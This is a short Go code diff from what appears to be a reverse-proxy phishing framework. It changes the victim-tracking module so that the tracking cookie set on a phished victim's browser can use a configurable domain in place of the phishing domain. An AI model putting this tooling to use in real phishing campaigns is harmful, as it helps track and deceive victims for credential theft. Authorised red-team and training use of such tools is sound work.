@@ -310,9 +310,17 @@ func (module *Tracker) TrackResponse(response *http.Response) (victim *Victim) {
 		// Trace not found in Cookies check If-Range HTTP Header
 		t = module.makeTrace(response.Request.Header.Get("If-Range"))
 		if t.IsValid() {
+
+			cookieDomain := module.Session.Config.Proxy.Phishing
+			if module.Session.Config.Tracking.Domain != "" {
+				cookieDomain = module.Session.Config.Tracking.Domain
+			}
+			module.Info("Setting tracking cookie for domain: %s", cookieDomain)
+
 			response.Header.Add("Set-Cookie",
 				fmt.Sprintf("%s=%s; Domain=%s; Path=/; Expires=Wed, 30 Aug 2029 00:00:00 GMT",
-					module.Identifier, t.ID, module.Session.Config.Proxy.Phishing))
+					module.Identifier, t.ID, cookieDomain))
+
 			response.Header.Add("If-Range", t.ID)
 			module.Debug("Found tracking in If-Range .. pushing cookie %s (%s)", response.Request.URL, t)
 			trackingFound = true
